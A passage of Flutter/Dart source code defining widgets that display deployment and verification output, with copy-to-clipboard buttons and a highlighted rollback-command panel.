                ),
              ),
            ),
          // Deploy result
          if (hasDeploy)
            _DeployResultOutput(
              result: deployResult!,
              isError: isDeployError,
              rollbackCommand: hasRollback ? rollbackCommand : null,
            ),
          // Verify result
          if (isVerifying)
            Container(
              width: double.infinity,
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: AppColors.bgDark.withValues(alpha: 0.8),
                borderRadius: const BorderRadius.only(
                  bottomLeft: Radius.circular(8),
                  bottomRight: Radius.circular(8),
                ),
                border: const Border(
                  top: BorderSide(color: AppColors.border),
                ),
              ),
              child: Row(
                children: [
                  SizedBox(
                    width: 12,
                    height: 12,
                    child: CircularProgressIndicator(
                      strokeWidth: 1.5,
                      color: AppColors.primary,
                    ),
                  ),
                  const SizedBox(width: 8),
                  Text(
                    'Verifying...',
                    style: AppTextStyles.caption(
                        size: 11, color: AppColors.textMuted),
                  ),
                ],
              ),
            ),
          if (hasVerify)
            Container(
              width: double.infinity,
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: AppColors.bgDark.withValues(alpha: 0.8),
                borderRadius: const BorderRadius.only(
                  bottomLeft: Radius.circular(8),
                  bottomRight: Radius.circular(8),
                ),
                border: const Border(
                  top: BorderSide(color: AppColors.border),
                ),
              ),
              child: SelectableText(
                verifyResult!.rawOutput ?? '(no output)',
                style: const TextStyle(
                  fontFamily: 'Monaco',
                  fontFamilyFallback: ['Courier New', 'monospace'],
                  fontSize: 10.5,
                  height: 1.4,
                  color: AppColors.textSecondary,
                ),
              ),
            ),
        ],
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// Deploy result output (with rollback button)
// ═══════════════════════════════════════════════════════════════════════════════

class _DeployResultOutput extends StatelessWidget {
  final String result;
  final bool isError;
  final String? rollbackCommand;

  const _DeployResultOutput({
    required this.result,
    required this.isError,
    this.rollbackCommand,
  });

  @override
  Widget build(BuildContext context) {
    return Container(
      width: double.infinity,
      decoration: BoxDecoration(
        color: isError
            ? AppColors.red.withValues(alpha: 0.05)
            : AppColors.bgDark.withValues(alpha: 0.8),
        borderRadius: const BorderRadius.only(
          bottomLeft: Radius.circular(8),
          bottomRight: Radius.circular(8),
        ),
        border: Border(
          top: BorderSide(
            color: isError
                ? AppColors.red.withValues(alpha: 0.3)
                : AppColors.border,
          ),
        ),
      ),
      padding: const EdgeInsets.all(10),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Expanded(
                child: SelectableText(
                  result,
                  style: TextStyle(
                    fontFamily: 'Monaco',
                    fontFamilyFallback: const [
                      'Courier New',
                      'monospace',
                    ],
                    fontSize: 11,
                    height: 1.5,
                    color: isError ? AppColors.red : AppColors.textSecondary,
                  ),
                ),
              ),
              const SizedBox(width: 6),
              IconButton(
                onPressed: () {
                  Clipboard.setData(ClipboardData(text: result));
                  ScaffoldMessenger.of(context).showSnackBar(
                    const SnackBar(
                      content: Text('Copied to clipboard'),
                      duration: Duration(seconds: 1),
                      behavior: SnackBarBehavior.floating,
                    ),
                  );
                },
                icon: const Icon(Icons.copy_outlined, size: 16),
                style: IconButton.styleFrom(
                  foregroundColor: AppColors.textSecondary,
                  padding: const EdgeInsets.all(4),
                  minimumSize: const Size(28, 28),
                ),
                tooltip: 'Copy',
              ),
            ],
          ),
          if (rollbackCommand != null && rollbackCommand!.isNotEmpty) ...[
            const SizedBox(height: 8),
            Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(
                color: AppColors.amber.withValues(alpha: 0.06),
                borderRadius: BorderRadius.circular(4),
                border: Border.all(
                    color: AppColors.amber.withValues(alpha: 0.25)),
              ),
              child: Row(
                children: [
                  const Icon(Icons.undo, size: 13, color: AppColors.amber),
                  const SizedBox(width: 6),
                  Expanded(
                    child: Text(
                      rollbackCommand!,
                      style: const TextStyle(
                        fontFamily: 'Monaco',
                        fontFamilyFallback: [
                          'Courier New',
                          'monospace'
                        ],
                        fontSize: 10,
                        color: AppColors.amber,
                      ),
                      maxLines: 3,
                      overflow: TextOverflow.ellipsis,
                    ),
                  ),
                  const SizedBox(width: 6),
                  IconButton(
                    onPressed: () {
                      Clipboard.setData(
                          ClipboardData(text: rollbackCommand!));
                      ScaffoldMessenger.of(context).showSnackBar(
                        const SnackBar(
                          content: Text('Rollback command copied'),
                          duration: Duration(seconds: 1),
                          behavior: SnackBarBehavior.floating,
                        ),
                      );
                    },
                    icon: const Icon(Icons.copy_outlined, size: 14),
                    style: IconButton.styleFrom(
                      foregroundColor: AppColors.amber,
                      padding: const EdgeInsets.all(2),
                      minimumSize: const Size(24, 24),
                    ),
                    tooltip: 'Copy rollback',
                  ),
                ],
              ),
            ),
          ],
        ],
      ),
    );
  }
}
